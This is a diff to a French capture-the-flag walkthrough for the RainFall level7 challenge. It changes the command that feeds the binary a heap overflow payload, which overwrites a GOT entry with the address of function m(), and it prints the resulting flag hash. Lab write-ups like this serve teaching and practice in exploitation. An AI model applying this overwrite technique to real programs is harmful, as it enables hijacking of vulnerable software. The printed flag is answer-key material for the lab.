@@ -35,7 +35,7 @@ gdb-peda$ x 0x8048400
 </pre>
 - Il suffit donc d'ecrire par dessus cet adresse pour qu'un jump soit fait vers la fonction m()
 ```
-level7@RainFall:~$ ./level7 `/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"` `/bin/echo -ne "\xf4\x84\x04\x08"`
+level7@RainFall:~$ ./level7 $(python -c "print('AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1631281606
 ```
